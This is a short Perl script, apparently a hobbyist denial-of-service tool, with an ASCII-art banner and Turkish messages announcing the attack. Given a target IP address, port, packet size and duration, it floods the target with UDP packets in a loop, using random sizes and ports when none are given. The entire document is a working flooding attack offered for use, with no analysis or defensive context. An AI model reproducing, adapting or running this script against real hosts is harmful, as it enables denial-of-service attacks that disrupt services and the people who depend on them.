#!/usr/bin/perl

##
# Coded By Sproid<----
##

use Socket;
use strict;

my ($ip,$port,$size,$time) = @ARGV;

my ($iaddr,$endtime,$psize,$pport);

$iaddr = inet_aton("$ip") or die "Cannot resolve hostname $ip\n";
$endtime = time() + ($time ? $time : 100);
socket(flood, PF_INET, SOCK_DGRAM, 17);

print <<EOTEXT;

                      .
                      00
                      000
                     00000                  .
                     000000                00
      .             0000000              0000
      0000          0000000            00000
      00000         00000000          000000
       000000       00000000        0000000
        0000000     00000000      000000000
        0000000      0000000     000000000
         0000000     00000000   000000000
           000000000  0000000   00000000
             0000000   000000  0000000            .
              000000  00000  0000000        000000
   .           000000  0000  000000    000000000
    0000000     000000 000   0000   00000000000
     0000000000   0000  00  0000  00000000000
       00000000000  000 00 000  0000000000
          00000000000 00 0 0  000000000
             00000000000000 0000
                      000000000
                    000     000000




 SALDIRI BAŞLATILDI // Coded by Sproid
EOTEXT

print "::ATTACKING:: $ip " . ($port ? $port : "random") . " Disrespected = " .
  ($size ? "$size-byte" : "Disconnected :)") . " ~Sproidfl1x~ " .
  ($time ? " for $time seconds" : "") . "\n";
print "Saldırıyı Çekmek İçin Ctrl-C\n" unless $time;

for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1024-64)+64) ;
  $pport = $port ? $port : int(rand(1500000))+1;

  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));}